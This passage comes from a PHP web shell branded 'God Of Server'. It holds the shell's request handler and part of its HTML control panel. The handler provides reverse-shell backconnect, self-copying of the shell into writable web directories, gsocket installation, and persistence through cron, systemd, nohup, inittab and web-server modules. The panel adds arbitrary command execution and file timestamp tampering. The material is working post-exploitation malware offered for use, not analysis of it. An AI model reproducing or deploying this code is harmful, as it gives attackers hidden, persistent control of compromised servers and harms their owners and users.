                } else {
                    $response['message'] = 'Backconnect failed';
                }
            } else {
                $response['message'] = 'Invalid IP or port';
            }
            break;
            
        case 'deploy':
            $base_path = $_POST['base_path'] ?? '/var/www';
            $paths = ShellDeployer::findWritablePaths($base_path);
            $response['success'] = true;
            $response['paths'] = $paths;
            break;
            
        case 'deploy_shell':
            $target_path = $_POST['target_path'] ?? '';
            $filenames = $_POST['filenames'] ?? 'config.php';
            $create_htaccess = isset($_POST['create_htaccess']) && $_POST['create_htaccess'] == '1';
            
            if (!is_array($filenames)) {
                $filenames = array_map('trim', explode(',', $filenames));
            }
            
            $shell_content = file_get_contents(__FILE__);
            $results = ShellDeployer::deployShell($target_path, $shell_content, $filenames, $create_htaccess, __FILE__);
            
            $response['success'] = true;
            $response['results'] = $results;
            $response['message'] = 'Deployment completed';
            break;
            
        case 'install_gsocket':
            $result = GsocketInstaller::install();
            $response = array_merge($response, $result);
            break;
            
        case 'port_check':
            $cmd = "netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null || sockstat -l 2>/dev/null";
            $output = $file_manager->executeCommand($cmd);
            $response['success'] = true;
            $response['output'] = $output;
            break;
            
        case 'find_backdoors':
            $path = $_POST['path'] ?? '/';
            $backdoors = ShellFinder::findBackdoors($path);
            $response['success'] = true;
            $response['backdoors'] = $backdoors;
            $response['count'] = count($backdoors);
            break;
            
        case 'install_defense':
            $defense_type = $_POST['defense_type'] ?? 'nohup';
            
            switch ($defense_type) {
                case 'nohup':
                    $result = $defense_system->installNohup();
                    $response = array_merge($response, $result);
                    break;
                    
                case 'cron':
                    $result = $defense_system->installCron();
                    $response = array_merge($response, $result);
                    break;
                    
                case 'systemd':
                    $result = $defense_system->installSystemd();
                    $response = array_merge($response, $result);
                    break;
                    
                case 'inittab':
                    $result = $defense_system->installInittab();
                    $response = array_merge($response, $result);
                    break;
                    
                case 'apache':
                    $result = $defense_system->installApacheModule();
                    $response = array_merge($response, $result);
                    break;
                    
                case 'nginx':
                    $result = $defense_system->installNginxModule();
                    $response = array_merge($response, $result);
                    break;
                    
                case 'windows':
                    $result = $defense_system->installWindowsPersistence();
                    $response = array_merge($response, $result);
                    break;
                    
                case 'litespeed':
                    $result = $defense_system->installLitespeedModule();
                    $response = array_merge($response, $result);
                    break;
            }
            break;
            
        case 'check_defense':
            $checks = [
                'nohup' => "ps aux | grep -v grep | grep 'kernel_'",
                'cron' => "crontab -l 2>/dev/null | grep -i 'php.*" . basename(__FILE__) . "' || grep -r 'php.*" . basename(__FILE__) . "' /etc/cron* 2>/dev/null",
                'systemd' => "systemctl list-unit-files | grep -i 'systemd-network'",
                'apache' => "find /etc/apache2 /usr/lib/apache2 /etc/httpd -name '*.so' -type f 2>/dev/null | xargs file 2>/dev/null | grep -i 'php'",
                'nginx' => "find /etc/nginx -name '*.conf' -type f 2>/dev/null | xargs grep -l 'include.*php' 2>/dev/null"
            ];
            
            $results = [];
            foreach ($checks as $type => $cmd) {
                $output = $file_manager->executeCommand($cmd);
                $results[$type] = !empty(trim($output));
            }
            
            $response['success'] = true;
            $response['results'] = $results;
            break;
    }
    
    echo json_encode($response);
    exit;
}

$server_info_header = getServerInfoHeader();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>◈ God Of Server</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0a0a0f;
            --bg-secondary: #121218;
            --bg-tertiary: #1a1a24;
            --bg-card: #151520;
            --text-primary: #e0e0ff;
            --text-secondary: #a0a0c0;
            --text-muted: #707090;
            --accent-red: #ff2e63;
            --accent-red-dark: #d91e4f;
            --accent-blue: #4a6fff;
            --accent-green: #08d9a6;
            --accent-yellow: #ffb347;
            --accent-purple: #9d4edd;
            --border-color: #2a2a3a;
            --border-light: #3a3a4a;
            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.3);
            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.4);
            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.5);
            --gradient-red: linear-gradient(135deg, #ff2e63 0%, #d91e4f 100%);
            --gradient-blue: linear-gradient(135deg, #4a6fff 0%, #2a4fcc 100%);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            font-size: 14px;
            line-height: 1.6;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: var(--bg-secondary);
            border-radius: 16px;
            padding: 24px 32px;
            margin-bottom: 24px;
            box-shadow: var(--shadow-lg);
            border: 1px solid var(--border-color);
            position: relative;
            overflow: hidden;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: var(--gradient-red);
        }
        
        .logo-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .logo {
            font-family: 'JetBrains Mono', monospace;
            font-weight: 700;
            font-size: 28px;
            background: var(--gradient-red);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -0.5px;
        }
        
        .server-status {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .status-indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--accent-green);
            box-shadow: 0 0 10px var(--accent-green);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .server-info-header {
            font-family: 'JetBrains Mono', monospace;
            background: rgba(0, 0, 0, 0.3);
            padding: 20px;
            border-radius: 12px;
            font-size: 13px;
            color: var(--accent-green);
            white-space: pre;
            word-break: break-all;
            border: 1px solid var(--border-color);
            line-height: 1.5;
            overflow-x: auto;
            margin-top: 20px;
        }
        
        .nav-tabs {
            display: flex;
            gap: 4px;
            margin-bottom: 24px;
            background: var(--bg-tertiary);
            padding: 8px;
            border-radius: 12px;
            border: 1px solid var(--border-color);
            flex-wrap: wrap;
        }
        
        .nav-btn {
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            padding: 10px 20px;
            background: transparent;
            border: none;
            border-radius: 8px;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.2s;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .nav-btn:hover {
            background: rgba(255, 46, 99, 0.1);
            color: var(--accent-red);
        }
        
        .nav-btn.active {
            background: var(--gradient-red);
            color: white;
            box-shadow: var(--shadow-sm);
        }
        
        .content-section {
            display: none;
            background: var(--bg-secondary);
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 24px;
            box-shadow: var(--shadow-md);
            border: 1px solid var(--border-color);
        }
        
        .content-section.active {
            display: block;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .section-title {
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            font-size: 18px;
            color: var(--text-primary);
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .section-title::before {
            content: '';
            width: 4px;
            height: 16px;
            background: var(--accent-red);
            border-radius: 2px;
        }
        
        .path-navigation {
            background: var(--bg-card);
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            border: 1px solid var(--border-color);
        }
        
        .path-breadcrumb {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 6px;
            margin-bottom: 16px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
        }
        
        .path-segment {
            padding: 6px 12px;
            background: var(--bg-tertiary);
            border-radius: 6px;
            color: var(--text-secondary);
            text-decoration: none;
            transition: all 0.2s;
            border: 1px solid transparent;
        }
        
        .path-segment:hover {
            background: rgba(255, 46, 99, 0.1);
            color: var(--accent-red);
            border-color: var(--accent-red);
        }
        
        .path-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .btn {
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 13px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
        }
        
        .btn-primary {
            background: var(--gradient-blue);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }
        
        .btn-danger {
            background: var(--gradient-red);
            color: white;
        }
        
        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #08d9a6 0%, #06b893 100%);
            color: white;
        }
        
        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #ffb347 0%, #ff9a3d 100%);
            color: white;
        }
        
        .btn-warning:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }
        
        .btn-purple {
            background: linear-gradient(135deg, #9d4edd 0%, #7b2cbf 100%);
            color: white;
        }
        
        .btn-purple:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }
        
        .file-list {
            background: var(--bg-card);
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
        }
        
        .file-header {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr 1.5fr 1fr 4fr;
            padding: 16px 20px;
            background: var(--bg-tertiary);
            color: var(--text-primary);
            border-bottom: 1px solid var(--border-color);
            font-size: 12px;
            font-weight: 600;
            font-family: 'JetBrains Mono', monospace;
        }
        
        .file-item {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr 1.5fr 1fr 4fr;
            padding: 14px 20px;
            border-bottom: 1px solid var(--border-light);
            align-items: center;
            transition: all 0.2s;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
        }
        
        .file-item:hover {
            background: rgba(255, 46, 99, 0.05);
        }
        
        .file-item:last-child {
            border-bottom: none;
        }
        
        .file-name {
            color: var(--text-primary);
            word-break: break-all;
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            padding: 5px 10px;
            border-radius: 6px;
            transition: background 0.2s;
        }
        
        .file-name:hover {
            background: rgba(255, 46, 99, 0.1);
        }
        
        .file-name.folder {
            color: var(--accent-blue);
        }
        
        .file-name.file {
            color: var(--accent-green);
        }
        
        .file-icon {
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
        }
        
        .file-actions {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
        }
        
        .file-action-btn {
            padding: 6px 10px;
            font-size: 11px;
            border-radius: 6px;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
            white-space: nowrap;
            font-family: 'Inter', sans-serif;
            font-weight: 500;
        }
        
        .badge {
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 500;
            display: inline-block;
        }
        
        .badge-folder {
            background: rgba(74, 111, 255, 0.15);
            color: var(--accent-blue);
            border: 1px solid rgba(74, 111, 255, 0.3);
        }
        
        .badge-file {
            background: rgba(8, 217, 166, 0.15);
            color: var(--accent-green);
            border: 1px solid rgba(8, 217, 166, 0.3);
        }
        
        .badge-hidden {
            background: rgba(160, 160, 192, 0.15);
            color: var(--text-secondary);
            border: 1px solid rgba(160, 160, 192, 0.3);
        }
        
        /* Terminal Improvements */
        .terminal-container {
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
            font-family: 'JetBrains Mono', monospace;
        }
        
        .terminal-header {
            background: var(--bg-tertiary);
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border-color);
            font-size: 13px;
        }
        
        .terminal-dots {
            display: flex;
            gap: 8px;
        }
        
        .terminal-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }
        
        .dot-red { background: #ff5f57; }
        .dot-yellow { background: #ffbd2e; }
        .dot-green { background: #28ca42; }
        
        .terminal-output {
            height: 400px;
            overflow-y: auto;
            padding: 20px;
            font-size: 13px;
            color: #08d9a6;
            background: #000;
            white-space: pre-wrap;
            word-wrap: break-word;
            line-height: 1.4;
        }
        
        .terminal-line {
            margin-bottom: 2px;
            font-family: 'JetBrains Mono', monospace;
        }
        
        .prompt {
            color: #4a6fff;
            font-weight: bold;
            display: inline;
        }
        
        .command {
            color: #08d9a6;
            display: inline;
        }
        
        .output {
            color: #a0a0c0;
            display: block;
            margin-top: 4px;
            font-family: 'JetBrains Mono', monospace;
            white-space: pre-wrap;
            word-break: break-all;
        }
        
        .terminal-input {
            display: flex;
            gap: 10px;
            padding: 20px;
            background: var(--bg-tertiary);
            border-top: 1px solid var(--border-color);
        }
        
        .terminal-input input {
            flex: 1;
            padding: 12px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
        }
        
        .terminal-input input:focus {
            outline: none;
            border-color: var(--accent-red);
        }
        
        /* Modal Improvements */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: var(--bg-card);
            border-radius: 16px;
            padding: 30px;
            min-width: 500px;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
            border: 1px solid var(--border-color);
            box-shadow: var(--shadow-lg);
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--border-color);
        }
        
        .modal-title {
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            font-size: 18px;
            color: var(--text-primary);
        }
        
        .modal-close {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 24px;
            cursor: pointer;
            line-height: 1;
            transition: color 0.2s;
        }
        
        .modal-close:hover {
            color: var(--accent-red);
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-label {
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            font-size: 13px;
            display: block;
            margin-bottom: 8px;
            color: var(--text-primary);
        }
        
        .form-control {
            font-family: 'JetBrains Mono', monospace;
            width: 100%;
            padding: 12px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 13px;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--accent-red);
            box-shadow: 0 0 0 2px rgba(255, 46, 99, 0.1);
        }
        
        textarea.form-control {
            min-height: 200px;
            resize: vertical;
        }
        
        /* File Upload Improvements */
        .upload-area {
            border: 2px dashed var(--border-color);
            border-radius: 12px;
            padding: 40px;
            text-align: center;
            margin: 20px 0;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .upload-area:hover {
            border-color: var(--accent-red);
            background: rgba(255, 46, 99, 0.05);
        }
        
        .upload-area input {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: pointer;
        }
        
        .upload-area-content {
            pointer-events: none;
        }
        
        .upload-icon {
            font-size: 48px;
            color: var(--accent-blue);
            margin-bottom: 16px;
        }
        
        .upload-text {
            font-size: 16px;
            color: var(--text-primary);
            margin-bottom: 8px;
        }
        
        .upload-hint {
            color: var(--text-muted);
            font-size: 12px;
        }
        
        /* Alert Improvements */
        .alert {
            padding: 16px;
            border-radius: 12px;
            margin-bottom: 20px;
            display: none;
            font-family: 'Inter', sans-serif;
            font-size: 13px;
            border: 1px solid transparent;
        }
        
        .alert-success {
            background: rgba(8, 217, 166, 0.1);
            border-color: var(--accent-green);
            color: var(--accent-green);
        }
        
        .alert-error {
            background: rgba(255, 46, 99, 0.1);
            border-color: var(--accent-red);
            color: var(--accent-red);
        }
        
        .alert-info {
            background: rgba(74, 111, 255, 0.1);
            border-color: var(--accent-blue);
            color: var(--accent-blue);
        }
        
        .alert-warning {
            background: rgba(255, 179, 71, 0.1);
            border-color: var(--accent-yellow);
            color: var(--accent-yellow);
        }
        
        /* Tools Grid */
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
            gap: 16px;
            margin-top: 20px;
        }
        
        .tool-card {
            background: var(--bg-card);
            padding: 24px;
            border-radius: 12px;
            border: 1px solid var(--border-color);
            transition: all 0.3s;
            cursor: pointer;
        }
        
        .tool-card:hover {
            transform: translateY(-5px);
            border-color: var(--accent-red);
            box-shadow: var(--shadow-lg);
        }
        
        .tool-title {
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            font-size: 16px;
            color: var(--text-primary);
            margin-bottom: 8px;
        }
        
        .tool-desc {
            font-family: 'Inter', sans-serif;
            color: var(--text-secondary);
            font-size: 13px;
            line-height: 1.5;
        }
        
        /* Result Items */
        .result-item {
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            background: var(--bg-tertiary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            border-left: 4px solid transparent;
        }
        
        .result-success {
            border-left-color: var(--accent-green);
        }
        
        .result-error {
            border-left-color: var(--accent-red);
        }
        
        /* Backdoor Results */
        .backdoor-item {
            padding: 12px;
            margin: 8px 0;
            background: var(--bg-tertiary);
            border-radius: 8px;
            border-left: 4px solid var(--accent-red);
        }
        
        .backdoor-path {
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            color: var(--text-primary);
            margin-bottom: 4px;
        }
        
        .backdoor-info {
            font-size: 11px;
            color: var(--text-muted);
        }
        
        @media (max-width: 1200px) {
            .file-header, .file-item {
                grid-template-columns: 1fr;
                gap: 10px;
            }
            
            .modal-content {
                min-width: 90%;
                margin: 20px;
            }
        }
        
        /* Create File/Modal Improvements */
        .create-modal {
            background: var(--bg-card);
            border-radius: 16px;
            padding: 30px;
            max-width: 500px;
            width: 100%;
            margin: 20px;
            border: 1px solid var(--border-color);
            box-shadow: var(--shadow-lg);
        }
        
        .create-title {
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            font-size: 18px;
            color: var(--text-primary);
            margin-bottom: 20px;
            text-align: center;
        }
        
        .create-input-group {
            margin-bottom: 20px;
        }
        
        .create-input-label {
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            font-size: 13px;
            color: var(--text-primary);
            margin-bottom: 8px;
            display: block;
        }
        
        .create-input {
            width: 100%;
            padding: 12px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
        }
        
        .create-input:focus {
            outline: none;
            border-color: var(--accent-red);
            box-shadow: 0 0 0 2px rgba(255, 46, 99, 0.1);
        }
        
        .create-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        
        /* File Preview */
        .file-preview {
            max-height: 300px;
            overflow-y: auto;
            background: var(--bg-primary);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
            margin-top: 10px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            white-space: pre-wrap;
            word-break: break-all;
        }
        
        /* Custom File Input */
        .custom-file-input {
            position: relative;
            display: inline-block;
            width: 100%;
        }
        
        .custom-file-input input[type="file"] {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }
        
        .custom-file-label {
            display: block;
            padding: 12px;
            background: var(--bg-secondary);
            border: 1px dashed var(--border-color);
            border-radius: 8px;
            text-align: center;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .custom-file-label:hover {
            border-color: var(--accent-red);
            color: var(--accent-red);
            background: rgba(255, 46, 99, 0.05);
        }
        
        .custom-file-name {
            margin-top: 8px;
            font-size: 12px;
            color: var(--text-muted);
            font-family: 'JetBrains Mono', monospace;
        }
        
        /* Chdate Input */
        .chdate-input {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .chdate-input input {
            flex: 1;
        }
        
        .chdate-now {
            padding: 12px 20px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            cursor: pointer;
            font-size: 13px;
            transition: all 0.2s;
        }
        
        .chdate-now:hover {
            background: var(--accent-blue);
            color: white;
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="logo-container">
                <div class="logo">◈ God Of Server</div>
                <div class="server-status">
                    <div class="status-indicator"></div>
                    <span style="color: var(--accent-green); font-family: 'JetBrains Mono', monospace;">LIVE</span>
                </div>
            </div>
            
            <div class="server-info-header"><?= nl2br(htmlspecialchars($server_info_header)) ?></div>
            
            <div class="nav-tabs">
                <button class="nav-btn active" data-section="filemanager">
                    File Manager
                </button>
                <button class="nav-btn" data-section="terminal">
                    Terminal
                </button>
                <button class="nav-btn" data-section="deploy">
                    Deploy
                </button>
                <button class="nav-btn" data-section="defense">
                    Defense
                </button>
                <button class="nav-btn" data-section="gsocket">
                    Install Gsocket
                </button>
                <button class="nav-btn" data-section="reverse">
                    Reverse Shell
                </button>
                <button class="nav-btn" data-section="portcheck">
                    Port Check
                </button>
                <button class="nav-btn" data-section="findbackdoor">
                    Find Backdoors
                </button>
            </div>
        </header>
        
        <div class="alert" id="global-alert"></div>
        
        <!-- File Manager Section -->
        <section id="filemanager" class="content-section active">
            <h2 class="section-title">File Manager</h2>
            
            <div class="path-navigation">
                <div class="path-breadcrumb">
                    <a href="?auth=<?= urlencode($AUTH_KEY) ?>&dir=/" class="path-segment">/</a>
                    <?php
                    $path_parts = explode('/', trim($directory_contents['current_path'], '/'));
                    $current_path = '';
                    foreach ($path_parts as $index => $part) {
                        if ($part === '') continue;
                        $current_path .= '/' . $part;
                        echo '<span style="color: var(--text-muted);">/</span>';
                        echo '<a href="?auth=' . urlencode($AUTH_KEY) . '&dir=' . urlencode($current_path) . '" class="path-segment">' . htmlspecialchars($part) . '</a>';
                    }
                    ?>
                </div>
                
                <div class="path-actions">
                    <button class="btn btn-primary" onclick="loadDirectory('<?= htmlspecialchars($directory_contents['home_path']) ?>')">
                        Home
                    </button>
                    <button class="btn btn-warning" onclick="loadDirectory('<?= htmlspecialchars($directory_contents['parent_path']) ?>')">
                        UP
                    </button>
                    <button class="btn btn-success" onclick="showUploadModal()">
                        Upload
                    </button>
                    <button class="btn btn-purple" onclick="showCreateFileModal()">
                    New File
                    </button>
                    <button class="btn btn-purple" onclick="showCreateFolderModal()">
                    New Folder
                    </button>
                </div>
            </div>
            
            <div class="file-list">
                <div class="file-header">
                    <div>Name</div>
                    <div>Type</div>
                    <div>Size</div>
                    <div>Modified</div>
                    <div>Permissions</div>
                    <div>Actions</div>
                </div>
                
                <!-- Directories -->
                <?php foreach ($directory_contents['directories'] as $dir): ?>
                <div class="file-item">
                    <div class="file-name folder" onclick="loadDirectory('<?= htmlspecialchars(addslashes($dir['path'])) ?>')">
                        <div class="file-icon">📁</div>
                        <?= htmlspecialchars($dir['name']) ?>
                    </div>
                    <div><span class="badge badge-folder">DIR</span></div>
                    <div><?= htmlspecialchars($dir['size']) ?></div>
                    <div><?= htmlspecialchars($dir['modified']) ?></div>
                    <div><code><?= htmlspecialchars($dir['permissions']) ?></code></div>
                    <div class="file-actions">
                        <button class="file-action-btn btn-warning" onclick="renameItem('<?= htmlspecialchars($dir['path']) ?>')">Rename</button>
                        <button class="file-action-btn btn-danger" onclick="deleteItem('<?= htmlspecialchars($dir['path']) ?>')">Delete</button>
                        <button class="file-action-btn btn-success" onclick="chmodItem('<?= htmlspecialchars($dir['path']) ?>')">Chmod</button>
                        <button class="file-action-btn btn-warning" onclick="chdateItem('<?= htmlspecialchars($dir['path']) ?>')">Chdate</button>
                    </div>
                </div>
                <?php endforeach; ?>
                
                <!-- Hidden Directories -->
                <?php foreach ($directory_contents['hidden_directories'] as $dir): ?>
                <div class="file-item">
                    <div class="file-name folder" onclick="loadDirectory('<?= htmlspecialchars(addslashes($dir['path'])) ?>')">
                        <div class="file-icon">📂</div>
                        <?= htmlspecialchars($dir['name']) ?>
                    </div>
                    <div><span class="badge badge-hidden">HIDDEN</span></div>
                    <div><?= htmlspecialchars($dir['size']) ?></div>
                    <div><?= htmlspecialchars($dir['modified']) ?></div>
                    <div><code><?= htmlspecialchars($dir['permissions']) ?></code></div>
                    <div class="file-actions">
                        <button class="file-action-btn btn-warning" onclick="renameItem('<?= htmlspecialchars($dir['path']) ?>')">Rename</button>
                        <button class="file-action-btn btn-danger" onclick="deleteItem('<?= htmlspecialchars($dir['path']) ?>')">Delete</button>
                        <button class="file-action-btn btn-success" onclick="chmodItem('<?= htmlspecialchars($dir['path']) ?>')">Chmod</button>
                        <button class="file-action-btn btn-warning" onclick="chdateItem('<?= htmlspecialchars($dir['path']) ?>')">Chdate</button>
                    </div>
                </div>
                <?php endforeach; ?>
                
                <!-- Files -->
                <?php foreach ($directory_contents['files'] as $file): ?>
                <div class="file-item">
                    <div class="file-name file" onclick="editFile('<?= htmlspecialchars(addslashes($file['path'])) ?>')">
                        <div class="file-icon">
                            <?php 
                            switch($file['extension']) {
                                case 'php': echo '🐘'; break;
                                case 'js': echo '📜'; break;
                                case 'html': case 'htm': echo '🌐'; break;
                                case 'css': echo '🎨'; break;
                                case 'zip': case 'tar': case 'gz': echo '📦'; break;
                                case 'txt': case 'log': echo '📄'; break;
                                case 'jpg': case 'png': case 'gif': echo '🖼️'; break;
                                default: echo '📄';
                            }
                            ?>
                        </div>
                        <?= htmlspecialchars($file['name']) ?>
                    </div>
                    <div><span class="badge badge-file"><?= strtoupper($file['extension'] ?: 'FILE') ?></span></div>
                    <div><?= htmlspecialchars($file['size']) ?></div>
                    <div><?= htmlspecialchars($file['modified']) ?></div>
                    <div><code><?= htmlspecialchars($file['permissions']) ?></code></div>
                    <div class="file-actions">
                        <button class="file-action-btn btn-primary" onclick="editFile('<?= htmlspecialchars($file['path']) ?>')">Edit</button>
                        <button class="file-action-btn btn-primary" onclick="viewFile('<?= htmlspecialchars($file['path']) ?>')">View</button>
                        <button class="file-action-btn btn-warning" onclick="renameItem('<?= htmlspecialchars($file['path']) ?>')">Rename</button>
                        <button class="file-action-btn btn-danger" onclick="deleteItem('<?= htmlspecialchars($file['path']) ?>')">Delete</button>
                        <button class="file-action-btn btn-success" onclick="chmodItem('<?= htmlspecialchars($file['path']) ?>')">Chmod</button>
                        <button class="file-action-btn btn-warning" onclick="chdateItem('<?= htmlspecialchars($file['path']) ?>')">Chdate</button>
                    </div>
                </div>
                <?php endforeach; ?>
                
                <!-- Hidden Files -->
                <?php foreach ($directory_contents['hidden_files'] as $file): ?>
                <div class="file-item">
                    <div class="file-name file" onclick="editFile('<?= htmlspecialchars(addslashes($file['path'])) ?>')">
                        <div class="file-icon">
                            <?php 
                            switch($file['extension']) {
                                case 'php': echo '🐘'; break;
                                case 'js': echo '📜'; break;
                                case 'html': case 'htm': echo '🌐'; break;
                                case 'css': echo '🎨'; break;
                                case 'zip': case 'tar': case 'gz': echo '📦'; break;
                                case 'txt': case 'log': echo '📄'; break;
                                default: echo '📄';
                            }
                            ?>
                        </div>
                        <?= htmlspecialchars($file['name']) ?>
                    </div>
                    <div><span class="badge badge-hidden">HIDDEN</span></div>
                    <div><?= htmlspecialchars($file['size']) ?></div>
                    <div><?= htmlspecialchars($file['modified']) ?></div>
                    <div><code><?= htmlspecialchars($file['permissions']) ?></code></div>
                    <div class="file-actions">
                        <button class="file-action-btn btn-primary" onclick="editFile('<?= htmlspecialchars($file['path']) ?>')">Edit</button>
                        <button class="file-action-btn btn-primary" onclick="viewFile('<?= htmlspecialchars($file['path']) ?>')">View</button>
                        <button class="file-action-btn btn-warning" onclick="renameItem('<?= htmlspecialchars($file['path']) ?>')">Rename</button>
                        <button class="file-action-btn btn-danger" onclick="deleteItem('<?= htmlspecialchars($file['path']) ?>')">Delete</button>
                        <button class="file-action-btn btn-success" onclick="chmodItem('<?= htmlspecialchars($file['path']) ?>')">Chmod</button>
                        <button class="file-action-btn btn-warning" onclick="chdateItem('<?= htmlspecialchars($file['path']) ?>')">Chdate</button>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
        </section>
        
        <!-- Terminal Section -->
        <section id="terminal" class="content-section">
            <h2 class="section-title">Terminal</h2>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div class="terminal-dots">
                        <div class="terminal-dot dot-red"></div>
                        <div class="terminal-dot dot-yellow"></div>
                        <div class="terminal-dot dot-green"></div>
                    </div>
                    <div>Current: <?= htmlspecialchars($directory_contents['current_path']) ?></div>
                </div>
                <div class="terminal-output" id="terminal-output">
                    <div class="terminal-line">
                        <span class="prompt">$</span> <span class="command">pwd</span>
                        <div class="output"><?= htmlspecialchars($directory_contents['current_path']) ?></div>
                    </div>
                </div>
                <div class="terminal-input">
                    <input type="text" id="terminal-command" placeholder="Type command and press Enter..." autocomplete="off">
                    <button class="btn btn-primary" onclick="executeTerminalCommand()">Execute</button>
                    <button class="btn btn-danger" onclick="executeTerminalCommand(true)">Background</button>
                </div>
            </div>
        </section>
        
        <!-- Deploy Section -->
        <section id="deploy" class="content-section">
            <h2 class="section-title">Deploy Shell</h2>
            <div class="alert alert-info">
                Deploy copies of this shell to multiple locations for persistence
            </div>
            
